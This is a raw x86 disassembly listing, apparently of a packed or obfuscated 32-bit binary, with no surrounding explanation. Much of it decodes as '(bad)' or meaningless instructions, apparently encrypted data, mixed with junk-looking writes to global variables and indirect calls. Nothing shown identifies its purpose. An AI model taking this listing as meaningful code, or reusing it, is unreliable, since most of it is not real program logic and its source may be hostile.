  402b01:	scas   al,BYTE PTR es:[edi]
  402b02:	inc    esp
  402b03:	popf   
  402b04:	mov    cl,0x83
  402b06:	(bad)  
  402b07:	adc    BYTE PTR cs:[edx-0x31],ah
  402b0b:	pusha  
  402b0c:	pushf  
  402b0d:	jo     0x402b62
  402b0f:	cmp    al,0x49
  402b11:	pop    ecx
  402b12:	sub    esp,ecx
  402b14:	in     eax,0x8b
  402b16:	(bad)  
  402b17:	out    0x16,eax
  402b19:	(bad)  
  402b1a:	mov    BYTE PTR [edx+0x30],bh
  402b1d:	pop    edx
  402b1e:	test   al,0x1f
  402b20:	push   esi
  402b21:	call   0x4f720496
  402b26:	(bad)  
  402b27:	mov    ah,0xeb
  402b29:	fwait
  402b2a:	bound  esp,QWORD PTR [ecx+0x3cf730b2]
  402b30:	jbe    0x402b0a
  402b32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b33:	or     BYTE PTR [ecx],ah
  402b35:	loope  0x402b51
  402b37:	dec    edi
  402b38:	mov    cl,0xc8
  402b3a:	mov    edi,0x4a64962f
  402b3f:	iret   
  402b40:	sub    eax,edi
  402b42:	jb     0x402b54
  402b44:	(bad)  
  402b45:	std    
  402b46:	pop    edx
  402b47:	sbb    al,bl
  402b49:	sahf   
  402b4a:	hlt    
  402b4b:	pop    esi
  402b4c:	loope  0x402baf
  402b4e:	sahf   
  402b4f:	in     al,0xb6
  402b51:	sbb    al,0x16
  402b53:	mov    al,0xcf
  402b55:	add    dl,ch
  402b57:	mov    ebp,0x99f39031
  402b5c:	mov    DWORD PTR [ebx],edx
  402b5e:	dec    ebp
  402b5f:	int3   
  402b60:	popf   
  402b61:	int3   
  402b62:	mov    ds:0x8f3b5aab,eax
  402b67:	test   BYTE PTR [ecx-0x3d],0x51
  402b6b:	push   eax
  402b6c:	push   0xddf
  402b71:	sbb    DWORD PTR ds:0x4283a7,0x41e0
  402b7b:	push   0x2d0f
  402b80:	call   0x422072
  402b85:	mov    ecx,DWORD PTR [ebp-0x68]
  402b88:	not    edx
  402b8a:	mov    edx,DWORD PTR [ebp-0x64]
  402b8d:	cmp    DWORD PTR ds:0x428293,0x0
  402b94:	mov    edx,DWORD PTR ds:0x4283a7
  402b9a:	mov    DWORD PTR ds:0x42819f,0x2873
  402ba4:	movzx  edx,WORD PTR ds:0x428243
  402bab:	jmp    0x402c06
  402bb0:	mov    DWORD PTR ds:0x42831b,ebx
  402bb6:	cmp    DWORD PTR ds:0x428293,0x0
  402bbd:	jb     0x402be8
  402bc3:	push   DWORD PTR [ebp-0x1c]
  402bc6:	call   DWORD PTR ds:0x428d94
  402bcc:	mov    edx,DWORD PTR ds:0x4282a3
  402bd2:	add    DWORD PTR ds:0x42827b,edx
  402bd8:	mov    DWORD PTR ds:0x42831f,0x7648
  402be2:	adc    edx,DWORD PTR ds:0x42825b
  402be8:	mov    edx,DWORD PTR ds:0x42832b
  402bee:	sbb    DWORD PTR ds:0x4282b7,edx
  402bf4:	mov    edx,DWORD PTR ds:0x428273
  402bfa:	xor    DWORD PTR ds:0x428337,edx
  402c00:	and    edx,DWORD PTR ds:0x42830f
  402c06:	xor    eax,ecx
  402c08:	mov    ecx,DWORD PTR [ebp-0x70]
  402c0b:	xor    edx,0x594e
  402c11:	mov    edx,DWORD PTR [ebp-0x6c]
  402c14:	add    DWORD PTR ds:0x42823b,0x7b5b
  402c1e:	sub    eax,ecx
  402c20:	mov    ecx,DWORD PTR ds:0x4281e3
  402c26:	mov    ecx,DWORD PTR [ecx]
  402c28:	and    DWORD PTR ds:0x42826b,ecx
  402c2e:	mov    ecx,DWORD PTR ds:0x422598
  402c34:	or     DWORD PTR ds:0x428163,0x509d
  402c3e:	lea    eax,[eax+ecx*1-0x27d2]
  402c45:	mov    ecx,DWORD PTR [ebp-0x1c]
  402c48:	mov    edx,DWORD PTR [ebp-0x2c]
  402c4b:	sbb    DWORD PTR ds:0x42830b,0x9f0
  402c55:	or     ecx,0x4f00
  402c5b:	add    DWORD PTR ds:0x42839f,0x42837b
  402c65:	jmp    0x403043
  402c6a:	nop
  402c6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c6c:	(bad)  
  402c6d:	call   0x1caec68c
  402c72:	int    0x3e
  402c74:	cmp    DWORD PTR [esi+edx*8+0xd],0xffffffa1
  402c79:	jo     0x402c31
  402c7b:	hlt    
  402c7c:	sbb    BYTE PTR [eax],bl
  402c7e:	sahf   
  402c7f:	adc    bl,BYTE PTR [eax]
  402c81:	sbb    bh,al
  402c83:	adc    DWORD PTR [eax],esi
  402c85:	xor    BYTE PTR [eax-0x5d715179],dh
  402c8b:	jg     0x402ce3
  402c8d:	xchg   ebp,eax
  402c8e:	fs pop ds
  402c90:	call   0x2316:0x64e825a1
  402c97:	or     al,0x13
  402c99:	cwde   
  402c9a:	push   edi
  402c9b:	or     BYTE PTR [esi+ecx*1+0x77c89d33],dh
  402ca2:	mov    eax,ds:0x8a230489
  402ca7:	hlt    
  402ca8:	in     al,0x6d
  402caa:	lahf   
  402cab:	int3   
  402cac:	cmp    ebp,DWORD PTR [eax]
  402cae:	ins    BYTE PTR es:[edi],dx
  402caf:	fstp   QWORD PTR [edx-0x53d4fc44]
  402cb5:	idiv   DWORD PTR [edi+eiz*4]
  402cb8:	xlat   BYTE PTR ds:[ebx]
  402cb9:	pop    edx
  402cba:	loop   0x402c86
  402cbc:	push   es
  402cbd:	mov    cl,0x70
  402cbf:	inc    edi
  402cc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cc1:	or     BYTE PTR [edi],cl
  402cc3:	popa   
  402cc4:	xor    al,bl
  402cc6:	sub    eax,0x9e9a37c6
  402ccb:	adc    al,0x30
  402ccd:	sbb    BYTE PTR cs:[ebp-0x21fe7e1e],ch
  402cd4:	jo     0x402c76
  402cd6:	hlt    
  402cd7:	les    ecx,FWORD PTR [edi+0x34e32826]
  402cdd:	or     al,0x42
  402cdf:	or     DWORD PTR fs:[esi+0x7b],0xd1101dc8
  402ce7:	push   ebx
  402ce8:	aas    
  402ce9:	cmp    dl,BYTE PTR [edx+edi*8+0x4b]
  402ced:	mov    edi,0x3311663b
  402cf2:	mov    esp,0x1656d4e
  402cf7:	jnp    0x402c7f
  402cf9:	mov    edi,DWORD PTR [edi-0x6975b298]
  402cff:	icebp  
  402d00:	adc    BYTE PTR [ecx-0x80],0x6f
  402d04:	pushf  
  402d05:	inc    edx
  402d06:	inc    edi
  402d07:	aas    
  402d08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d09:	das    
  402d0a:	push   ds
  402d0b:	leave  
  402d0c:	mov    al,0xbd
  402d0e:	test   bl,bh
  402d10:	dec    ebx
  402d11:	jge    0x402d25
  402d13:	mov    eax,0xa1bec0c5
  402d18:	sti    
  402d19:	and    BYTE PTR [edx],0x22
  402d1c:	mov    eax,0x5a8acbba
  402d21:	bound  esi,QWORD PTR [edx-0x4666df06]
  402d27:	call   0xcc1eac84
  402d2c:	call   0x1172584
  402d31:	(bad)  
  402d32:	adc    esi,DWORD PTR [esi]
  402d34:	xchg   ecx,eax
  402d35:	mov    ah,0x2f
  402d37:	cmp    al,0xe5
  402d39:	mov    edx,esp
  402d3b:	lock shl DWORD PTR [edi-0x65ef4c71],cl
  402d42:	push   ss
  402d43:	ja     0x402da1
  402d45:	adc    cl,BYTE PTR [esi]
  402d47:	(bad)
  402d4a:	dec    esi
  402d4b:	or     BYTE PTR [ebx-0x241077f4],dh
  402d51:	adc    ah,BYTE PTR [ebx+eax*2]
  402d54:	clc    
  402d55:	pop    eax
  402d56:	and    eax,0x41e62085
  402d5b:	test   al,0xf5
  402d5d:	xchg   esp,eax
  402d5e:	adc    cl,BYTE PTR [edx+0x2d87a78d]
  402d64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d65:	push   ebp
  402d66:	clc    
  402d67:	jp     0x402d4d
  402d69:	and    eax,0xbbd8043e
  402d6e:	fwait
  402d6f:	lock jbe 0x402d2d
  402d72:	cmp    BYTE PTR [eax-0x5f],dh
  402d75:	inc    ebp
  402d76:	mov    edx,0x64750920
  402d7b:	sub    eax,0xffffff95
  402d7e:	xchg   ebp,eax
  402d7f:	sbb    DWORD PTR [eax],0x5b770047
  402d85:	jae    0x402dce
  402d87:	loop   0x402e01
  402d89:	pop    eax
  402d8a:	fs jb  0x402dbf
  402d8d:	outs   dx,BYTE PTR ds:[esi]
  402d8e:	aam    0xb3
  402d90:	jl     0x402d42
  402d92:	and    ebp,DWORD PTR ds:0xf22d164f
  402d98:	int3   
  402d99:	mov    bl,0xd2
  402d9b:	mov    ecx,0xc7dc748a
  402da0:	les    esi,FWORD PTR [ebx-0x36]
  402da3:	out    dx,al
  402da4:	push   ebp
  402da5:	mov    bl,0xe6
  402da7:	push   ss
  402da8:	in     al,0xfb
  402daa:	(bad)
  402dad:	out    0x5d,al
  402daf:	and    bl,BYTE PTR [edi-0x580ec08b]
  402db5:	add    cl,BYTE PTR [ecx-0x3b]
  402db8:	fdiv   QWORD PTR [ebx-0x20]
  402dbb:	jmp    DWORD PTR [eax+edi*1+0x4268e94d]
  402dc2:	stos   BYTE PTR es:[edi],al
  402dc3:	adc    DWORD PTR [edi-0x2],esi
  402dc6:	lock popf 
  402dc8:	fwait
  402dc9:	mov    ch,0x8c
  402dcb:	push   cs
  402dcc:	xchg   ecx,eax
  402dcd:	pop    ebx
  402dce:	bnd jle 0x402e16
  402dd1:	test   BYTE PTR [ecx+0x21669878],0x42
  402dd8:	add    ecx,edi
  402dda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ddb:	mov    esi,DWORD PTR [eax+0x6e639379]
  402de1:	fsubr  QWORD PTR [edi-0x7118a5d9]
  402de7:	sub    eax,0xe44032b1
  402dec:	mov    al,0xd3
  402dee:	inc    eax
  402def:	bound  ebx,QWORD PTR [edx+0x58]
  402df2:	sub    bh,ch
  402df4:	cld    
  402df5:	pop    ebp
  402df6:	inc    ecx
  402df7:	push   edx
  402df8:	mov    al,0xde
  402dfa:	test   al,0x3
  402dfc:	jo     0x402d7f
  402dfe:	pop    esp
  402dff:	fnsave [edx]
  402e01:	cmp    eax,0x60a8e06f
  402e06:	jmp    0x71f4:0x96c45959
  402e0d:	mov    bl,0xfe
  402e0f:	inc    edx
  402e10:	mov    ebp,0xbe2fa5aa
  402e15:	std    
  402e16:	dec    esi
  402e17:	imul   eax,DWORD PTR [ecx],0xc53c0502
  402e1d:	cs and al,0xf9
  402e20:	cli    
  402e21:	out    0xe1,eax
  402e23:	adc    al,0x62
  402e25:	sbb    BYTE PTR [esi],ah
  402e27:	push   edi
  402e28:	xor    eax,0x2e75b327
  402e2d:	mov    eax,ds:0x82632531
  402e32:	shl    BYTE PTR [ebx],cl
  402e34:	sub    al,0x21
  402e36:	nop
  402e37:	mov    ebx,0x774eac6
  402e3c:	enter  0xacd2,0x70
  402e40:	in     eax,0x4
  402e42:	in     al,dx
  402e43:	in     eax,dx
  402e44:	and    eax,0x4a1cd6dd
  402e49:	stos   BYTE PTR es:[edi],al
  402e4a:	dec    edi
  402e4b:	cmp    edx,DWORD PTR [ecx-0x36e8b6df]
  402e51:	or     eax,0xa830d204
  402e56:	push   eax
  402e57:	into   
  402e58:	and    ch,bh
  402e5a:	cli    
  402e5b:	(bad)  
  402e5c:	xchg   esi,eax
  402e5d:	sub    eax,0x4648767
  402e62:	scas   al,BYTE PTR es:[edi]
  402e63:	rep outs dx,BYTE PTR ds:[esi]
  402e65:	mov    ebx,0x13e59b23
  402e6a:	stos   DWORD PTR es:[edi],eax
  402e6b:	push   ss
  402e6c:	or     eax,0x37a46799
  402e71:	jmp    0x402e71
  402e73:	mov    ds:0x8bc1afec,eax
  402e78:	loopne 0x402ebf
  402e7a:	sub    esp,DWORD PTR [eax+0x61c6cc3d]
  402e80:	ss push esp
  402e82:	jmp    0x6f1d:0x8411db5d
  402e89:	xor    DWORD PTR [edi-0x1225d70e],0x6e805c37
  402e93:	push   ecx
  402e94:	push   ebp
  402e95:	cmp    ebp,ecx
  402e97:	(bad)
  402e9b:	retf   
  402e9c:	int3   
  402e9d:	mov    ebx,0x864846e3
  402ea2:	stc    
  402ea3:	pop    ecx
  402ea4:	mov    al,ds:0xa95726a4
  402ea9:	xor    BYTE PTR [eax-0xf],bl
  402eac:	jns    0x402e61
  402eae:	out    0x41,eax
  402eb0:	(bad)
  402eb4:	daa    
  402eb5:	cmp    al,bh
  402eb7:	xchg   esp,eax
  402eb8:	or     bh,BYTE PTR [ebp-0x1aae5eb3]
  402ebe:	cs retf 0xcea8
  402ec2:	and    DWORD PTR [esi-0x62],esp
  402ec5:	pop    esi
  402ec6:	aam    0x1f
  402ec8:	je     0x402ee5
  402eca:	repnz daa 
  402ecc:	scas   al,BYTE PTR es:[edi]
  402ecd:	sbb    DWORD PTR [edi-0x32],esi
  402ed0:	mov    eax,0x61114dac
  402ed5:	in     eax,dx
  402ed6:	pop    edi
  402ed7:	jno    0x402ede
  402ed9:	jnp    0x402f27
  402edb:	pusha  
  402edc:	pop    edx
  402edd:	mov    ebp,0x3873f37e
  402ee2:	ss dec ecx
  402ee4:	aaa    
  402ee5:	add    al,0x2
  402ee7:	xor    edi,DWORD PTR [ebp+0x7b]
  402eea:	push   0xffffffeb
  402eec:	iret   
  402eed:	xchg   ecx,eax
  402eee:	stc    
  402eef:	mov    ecx,0x69f66f46
  402ef4:	cmp    esi,DWORD PTR [ebp+0xdf760f7]
  402efa:	fcmovnbe st,st(2)
  402efc:	hlt    
  402efd:	xchg   ecx,eax
  402efe:	pusha  
  402eff:	std    
  402f00:	add    DWORD PTR [ebp-0x7363f3cb],esi
  402f06:	cmp    DWORD PTR [ebx-0x56],ecx
  402f09:	or     bh,bh
  402f0b:	fistp  DWORD PTR [ecx]
  402f0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f0e:	jae    0x402eed
  402f10:	neg    DWORD PTR cs:[edi+ecx*2-0x5dfbc180]
  402f18:	out    0x68,eax
  402f1a:	push   ebp
  402f1b:	jmp    0x6c87fc8a
  402f20:	aad    0x2f
  402f22:	(bad)  [edi-0xc]
  402f25:	push   es
  402f26:	pop    ecx
  402f27:	and    cl,ah
  402f29:	cli    
  402f2a:	or     esp,ebx
  402f2c:	jnp    0x402f97
  402f2e:	add    BYTE PTR [ecx+0x494566fe],0x93
  402f35:	push   ds
  402f36:	shr    DWORD PTR ds:0x7ab56a46,1
  402f3c:	ds jl  0x402fb9
  402f3f:	cmp    eax,DWORD PTR [edx]
  402f41:	ins    DWORD PTR es:[edi],dx
  402f42:	add    edx,edx
  402f44:	icebp  
  402f45:	out    dx,al
  402f46:	adc    eax,0x25ce7864
  402f4b:	mov    esi,0x3a3297c1
  402f50:	aas    
  402f51:	out    0xcc,eax
  402f53:	push   esp
  402f54:	jo     0x402ee5
  402f56:	stos   DWORD PTR es:[edi],eax
  402f57:	sub    al,0x34
  402f5a:	fild   DWORD PTR [edi]
  402f5c:	aas    
  402f5d:	mov    cl,0x11
  402f5f:	push   edi
  402f60:	xor    eax,0x1ee0e8bc
  402f65:	xor    dl,BYTE PTR es:[edi+0x1a854153]
  402f6c:	lods   eax,DWORD PTR ds:[esi]
  402f6d:	call   0x749d:0xb4ded429
  402f74:	cwde   
  402f75:	das    
  402f76:	loop   0x402f27
  402f78:	mov    dh,BYTE PTR [eax]
  402f7a:	ret    0x99f9
  402f7d:	enter  0x1000,0x9e
  402f81:	(bad)  
  402f82:	ret    0x2353
  402f85:	jne    0x402f42
  402f87:	mov    DWORD PTR ds:0x661b26d3,0xe54b35a9
  402f91:	mov    ebp,0x2c22369f
  402f96:	out    dx,eax
  402f97:	pop    ss
  402f98:	dec    edx
  402f99:	loop   0x402f20
  402f9b:	cli    
  402f9c:	jge    0x402fe5
  402f9e:	cmp    al,BYTE PTR [esp+esi*8+0x68]
  402fa2:	cs pusha 
  402fa4:	outs   dx,DWORD PTR ds:[esi]
  402fa5:	lock adc ebp,DWORD PTR [eax+0x59]
  402fa9:	push   ss
  402faa:	test   BYTE PTR [edx+0x6829b963],0x5c
  402fb1:	xlat   BYTE PTR ds:[ebx]
  402fb2:	stos   BYTE PTR es:[edi],al
  402fb3:	cmovo  edx,DWORD PTR ds:0x354d661c
  402fbb:	jl     0x402fe1
  402fbd:	mov    edi,0x30ff266e
  402fc2:	ret    0x3a6f
  402fc5:	(bad)  
  402fc6:	mov    edi,0xf7d8cf05
  402fcb:	test   eax,0xdd85878a
  402fd0:	pop    es
  402fd1:	dec    edi
  402fd2:	sub    esi,DWORD PTR [ecx+0x1b01d065]
  402fd8:	jp     0x402fc1
  402fda:	fidiv  DWORD PTR fs:[ebp+0x5e22469b]
  402fe1:	lods   eax,DWORD PTR ds:[esi]
  402fe2:	push   ebx
  402fe3:	push   ebp
  402fe4:	dec    ebp
  402fe5:	pusha  
  402fe6:	pop    es
  402fe7:	cli    
  402fe8:	adc    ebx,DWORD PTR [edi+0x64f78d1]
  402fee:	pop    ss
  402fef:	mov    al,ds:0x9e8ac89a
  402ff4:	dec    edx
  402ff5:	xchg   DWORD PTR [edx+0x3da4d127],ebp
  402ffb:	stos   BYTE PTR es:[edi],al
  402ffc:	mov    cl,0x96
  402ffe:	in     al,0x6d
  403000:	adc    BYTE PTR [esi-0x31],0x2b
  403004:	shl    DWORD PTR [eax],1
  403006:	inc    ecx
  403007:	jns    0x402f97
  403009:	mov    ds:0x600be955,al
  40300e:	push   edi
  40300f:	push   esp
  403011:	jecxz  0x40303c
  403013:	js     0x402fc9
  403015:	sub    eax,ebp
  403017:	outs   dx,BYTE PTR ds:[esi]
  403018:	or     eax,0x38e16687
  40301d:	add    bh,BYTE PTR [ebx-0x9]
  403020:	mov    al,ds:0x373816d1
  403025:	sub    BYTE PTR [esi],al
  403027:	pop    ebx
  403028:	test   DWORD PTR [ecx-0x726da2db],esi
  40302e:	je     0x403019
  403030:	in     eax,dx
  403031:	sbb    al,BYTE PTR [edi]
  403033:	imul   ebp,DWORD PTR [ebx-0xa61d1ff],0xffffffdf
  40303a:	sbb    esi,DWORD PTR ds:0xbfd15cf4
  403040:	jbe    0x4030a7
  403042:	and    ah,BYTE PTR [ebx]
  403044:	retf   0xc281
  403047:	arpl   WORD PTR [eax+eax*1],si
  40304a:	add    BYTE PTR [ebx-0x35f433ab],cl
  403050:	xor    ecx,0x5fdd
  403056:	cmp    ecx,DWORD PTR [eax]
  403058:	mov    DWORD PTR ds:0x4282ab,0x665d
  403062:	jne    0x40a9b0
  403068:	mov    ecx,DWORD PTR [esi]
  40306a:	cmp    DWORD PTR ds:0x4283af,0x0
  403071:	mov    DWORD PTR ds:0x4283b3,edx
  403077:	mov    DWORD PTR ds:0x4282fb,0x1413
  403081:	mov    edx,DWORD PTR ds:0x4283a3
  403087:	jmp    0x4030db
  40308c:	mov    DWORD PTR ds:0x42816f,0x4beb
  403096:	not    eax
  403098:	cmp    DWORD PTR ds:0x4283af,0x0
  40309f:	jl     0x4030c1
  4030a5:	push   DWORD PTR [ebp-0x20]
  4030a8:	push   DWORD PTR [ebp-0xc]
  4030ab:	call   DWORD PTR ds:0x428db4
  4030b1:	mov    DWORD PTR ds:0x42825b,0x4e29
  4030bb:	inc    DWORD PTR ds:0x42827f
  4030c1:	or     edx,DWORD PTR ds:0x42831b
  4030c7:	add    edx,DWORD PTR ds:0x42819f
  4030cd:	sub    edx,edx
  4030cf:	add    DWORD PTR ds:0x4283a7,edx
  4030d5:	sbb    edx,DWORD PTR ds:0x42832f
  4030db:	mov    eax,DWORD PTR [esi+0x4]
  4030de:	sbb    edx,DWORD PTR ds:0x428393
  4030e4:	shrd   ecx,eax,0x2
  4030e8:	shr    eax,0x2
  4030eb:	mov    eax,DWORD PTR [esi]
  4030ed:	xor    DWORD PTR ds:0x4283b3,edx
  4030f3:	mov    edx,DWORD PTR [esi+0x4]
  4030f6:	neg    DWORD PTR ds:0x42816b
  4030fc:	shl    eax,0x1e
  4030ff:	xor    ecx,edi
  403101:	xor    eax,eax
  403103:	sbb    DWORD PTR ds:0x4283b7,0x1e67
  40310d:	or     eax,ecx
  40310f:	jmp    0x4034ed
  403114:	and    al,0xd6
  403116:	push   esp
  403117:	repnz and dh,BYTE PTR [ebx+0x22]
  40311b:	inc    esi
  40311c:	sar    BYTE PTR [eax-0x73],1
  40311f:	jo     0x4030b4
  403121:	or     ebx,0x18ec3d70
  403127:	sbb    BYTE PTR [esi-0x29e7e7ee],bl
  40312d:	mov    edx,0xc08730e2
  403132:	pop    ss
  403133:	cs mov edi,0x2f6f082a
  403139:	ror    ecx,0x1b
  40313c:	xchg   ecx,eax
  40313d:	xchg   edx,eax
  40313e:	imul   ebp,DWORD PTR [edx+eax*1-0xc],0xffffffed
  403143:	fstp   DWORD PTR [ebx+ebp*4]
  403146:	fidiv  WORD PTR [ecx]
  403148:	dec    BYTE PTR [edx]
  40314a:	xor    eax,0xeb7689a
  40314f:	and    ebp,DWORD PTR [ecx]
  403151:	fisub  WORD PTR [esi+0x75452e03]
  403157:	pop    esp
  403158:	sar    BYTE PTR [ebp-0x13],cl
  40315b:	sbb    bl,0xee
  40315e:	inc    eax
  40315f:	daa    
  403160:	jmp    0x4031bf
  403162:	xor    DWORD PTR [ebp+0xd],esi
  403165:	mov    dl,0xff
  403167:	adc    ebx,DWORD PTR [esi]
  403169:	hlt    
  40316a:	test   al,0xd9
  40316c:	aas    
  40316d:	sti    
  40316e:	xor    cl,BYTE PTR [ecx]
  403170:	aam    0xf8
  403172:	push   ecx
  403173:	mov    edi,0xc50b2484
  403178:	rol    BYTE PTR [esi-0x5f],0x17
  40317c:	xchg   edx,eax
  40317d:	and    eax,DWORD PTR [ebx]
  40317f:	sbb    esi,DWORD PTR [ecx-0x65]
  403182:	dec    ebp
  403183:	aas    
  403184:	xor    eax,0x59bc428d
  403189:	ror    DWORD PTR [ecx+0x14ab0808],0xab
  403190:	adc    DWORD PTR [edi+ebp*1],eax
  403193:	loope  0x40312c
  403195:	sbb    edx,DWORD PTR [ebp+0x2b]
  403198:	jge    0x4031fc
  40319a:	pop    ss
  40319b:	inc    ebx
  40319c:	lea    esp,[edi]
  40319e:	adc    al,0x90
  4031a0:	or     DWORD PTR [edx],0xaf92e8b6
  4031a6:	adc    al,0x97
  4031a8:	pop    edi
  4031a9:	dec    ebp
  4031aa:	gs mov cl,0xd5
  4031ad:	lahf   
  4031ae:	stos   DWORD PTR es:[edi],eax
  4031af:	dec    esi
  4031b0:	lods   eax,DWORD PTR ds:[esi]
  4031b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031b2:	push   cs
  4031b3:	(bad)  
  4031b4:	clc    
  4031b5:	jnp    0x4031bb
  4031b7:	fisttp QWORD PTR [edi-0x6b7abfc]
  4031bd:	adc    BYTE PTR [edi-0x79],0xc1
  4031c1:	xchg   DWORD PTR [ebp-0x32],edi
  4031c4:	mov    al,0xd4
  4031c6:	popa   
  4031c7:	loop   0x4031a9
  4031c9:	xchg   BYTE PTR [eax-0x5215124e],ah
  4031cf:	xchg   esp,eax
  4031d0:	xor    dh,BYTE PTR [eax-0x7c]
  4031d3:	inc    edi
  4031d4:	xchg   BYTE PTR [eax],ah
  4031d6:	jne    0x40323e
  4031d8:	mov    ds:0xc64df29a,eax
  4031dd:	ret    0x5f88
  4031e0:	cld    
  4031e1:	shr    DWORD PTR [esi-0x48bc6a39],1
  4031e7:	les    ecx,FWORD PTR [esi]
  4031e9:	push   esp
  4031ea:	push   esp
  4031eb:	cld    
  4031ec:	test   al,0x12
  4031ee:	ret    
  4031ef:	mov    dl,0x41
  4031f1:	push   es
  4031f2:	stos   BYTE PTR es:[edi],al
  4031f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031f4:	xor    bh,BYTE PTR [eax-0x8853e30]
  4031fa:	xor    BYTE PTR [esi+0x69a85aac],bl
  403200:	int    0xbe
  403202:	push   ebp
  403203:	xchg   edx,eax
  403204:	push   0x479ed2ee
  403209:	sub    DWORD PTR [edx+0x7f],ecx
  40320c:	ja     0x403278
  40320e:	fstp   QWORD PTR [eax+0xaeb8c72]
  403214:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403215:	pop    ebp
  403216:	(bad)  
  403217:	rep lods eax,DWORD PTR ds:[esi]
  403219:	popa   
  40321a:	(bad)  
  40321b:	and    edi,ebp
  40321d:	je     0x4031c5
  40321f:	pop    ss
  403220:	dec    ecx
  403221:	mov    edi,0x10f7ec4
  403226:	adc    al,0xd7
  403228:	mov    eax,ds:0xadf9db60
  40322d:	test   BYTE PTR [ecx-0x7746e210],bh
  403233:	pop    esi
  403234:	push   eax
  403235:	and    dh,BYTE PTR [eax]
  403237:	mov    bl,0x67
  403239:	fsubr  QWORD PTR [esi+0x1ee783f2]
  40323f:	dec    edx
  403240:	js     0x4032bb
  403242:	inc    ecx
  403243:	push   cs
  403244:	xchg   ecx,eax
  403245:	jns    0x4032bd
  403247:	push   esp
  403248:	imul   ebp,esp,0xb4b65c0e
  40324e:	es mov bl,0xc
  403251:	lods   eax,DWORD PTR ds:[esi]
  403252:	jmp    0xe46a:0xcba414f6
  403259:	xchg   esp,eax
  40325a:	loop   0x403220
  40325c:	xchg   esp,eax
  40325d:	adc    al,0x94
  40325f:	jecxz  0x4032a5
  403261:	mov    eax,0x42cd5ee1
  403266:	retf   0x3dd8
  403269:	adc    dl,BYTE PTR [ecx+0x27]
  40326c:	and    BYTE PTR [ebp-0xd],0x69
  403270:	add    esp,DWORD PTR [ebx-0x63]
  403273:	fisub  WORD PTR [edi-0x4a0d63d8]
  403279:	mov    dl,0xeb
  40327b:	ins    BYTE PTR es:[edi],dx
  40327c:	gs mov bh,0x5a
  40327f:	add    DWORD PTR [ebx+0x385798e4],ecx
  403285:	mov    dh,0xb3
  403287:	sub    BYTE PTR [ebx+eiz*4-0x124295c2],dh
  40328e:	and    al,0x1
  403290:	pop    edi
  403291:	addr16 and edi,edi
  403294:	adc    bh,BYTE PTR [ebx+0x2da3e6dc]
  40329a:	int    0xe9
  40329c:	fs out dx,eax
  40329e:	cmc    
  40329f:	sub    DWORD PTR [edx+0x18c2a2c2],0x4728b561
  4032a9:	add    BYTE PTR [edi],bh
  4032ab:	loope  0x4032b3
  4032ad:	mov    eax,ds:0x4f72e7a5
  4032b2:	ja     0x40332d
  4032b4:	cld    
  4032b5:	fdiv   DWORD PTR [ecx+0x2d]
  4032b8:	xor    DWORD PTR [esi+0x6],ecx
  4032bb:	adc    DWORD PTR [esi],esi
  4032bd:	dec    esp
  4032be:	mov    ebx,0x183d8ee3
  4032c3:	or     eax,DWORD PTR [ecx-0x5a]
  4032c6:	icebp  
  4032c7:	stos   DWORD PTR es:[edi],eax
  4032c8:	inc    ebp
  4032c9:	fst    QWORD PTR [ebp-0x72]
  4032cc:	xor    DWORD PTR [eax-0x9],ebx
  4032cf:	adc    eax,0xf9ad4b8c
  4032d4:	enter  0x1124,0x28
  4032d8:	outs   dx,DWORD PTR ss:[esi]
  4032da:	adc    eax,0x36fd868
  4032df:	xor    BYTE PTR [eax-0x433d9e8b],cl
  4032e5:	push   cs
  4032e6:	hlt    
  4032e7:	es pop ss
  4032e9:	sbb    ebx,DWORD PTR [edi-0x22]
  4032ec:	jecxz  0x40330e
  4032ee:	retf   
  4032ef:	das    
  4032f0:	mov    al,0x2c
  4032f2:	cmp    eax,0x6319f8a9
  4032f7:	adc    BYTE PTR [edi+eax*4-0x317ba3fe],bh
  4032fe:	aad    0x58
  403300:	xchg   ebx,eax
  403301:	xchg   ebx,eax
  403302:	je     0x40336c
  403304:	push   edi
  403305:	test   DWORD PTR [esp+eiz*2-0x33],esp
  403309:	xchg   esp,eax
  40330a:	mov    ah,BYTE PTR [edi-0x4a7975c5]
  403310:	jge    0x403320
  403312:	test   esp,esi
  403314:	inc    edi
  403315:	sbb    DWORD PTR [edx],eax
  403317:	xor    bh,BYTE PTR [eax]
  403319:	xchg   DWORD PTR [eax],eax
  40331b:	and    eax,0xfc9910a2
  403320:	sbb    eax,0x4fcdf7e9
  403325:	test   DWORD PTR [ecx],0xe3942fa5
  40332b:	pop    ecx
  40332c:	mov    ah,0xc
  40332e:	or     edx,DWORD PTR [ebx+0x4af5634]
  403334:	or     eax,0x12639bb7
  403339:	and    DWORD PTR [esi],edx
  40333b:	ss scas eax,DWORD PTR es:[edi]
  40333d:	and    al,0x16
  40333f:	xor    eax,ebp
  403341:	jle    0x403312
  403343:	(bad)  [ecx+0x7c]
  403346:	adc    BYTE PTR [ecx-0x1dca5501],bl
  40334c:	sub    BYTE PTR [ecx+0x2a826009],bh
  403352:	aaa    
  403353:	js     0x4033d0
  403355:	jae    0x4032e8
  403357:	pop    edi
  403358:	outs   dx,BYTE PTR ds:[esi]
  403359:	add    eax,0x6aabb854
  40335e:	aad    0xb0
  403360:	mov    edi,?
  403362:	mov    ds,eax
  403364:	cmp    BYTE PTR [ebx],dh
  403366:	mov    bh,0xd0
  403368:	mov    ebp,0x49abe531
  40336d:	sub    ebp,DWORD PTR [edx]
  40336f:	mov    dl,0x97
  403371:	pop    ds
  403372:	out    dx,eax
  403373:	jne    0x40332f
  403375:	add    BYTE PTR [ebx-0x61],cl
  403378:	and    DWORD PTR [esi-0x6b],ebx
  40337b:	dec    BYTE PTR [edx+ebx*8-0x6d]
  40337f:	cmp    ah,BYTE PTR [edx]
  403381:	dec    ecx
  403382:	sbb    BYTE PTR [edi-0x25c3dc51],ah
  403388:	js     0x4033a4
  40338a:	cmp    esp,ebx
  40338c:	push   ebx
  40338d:	jge    0x403342
  40338f:	inc    ecx
  403390:	in     eax,dx
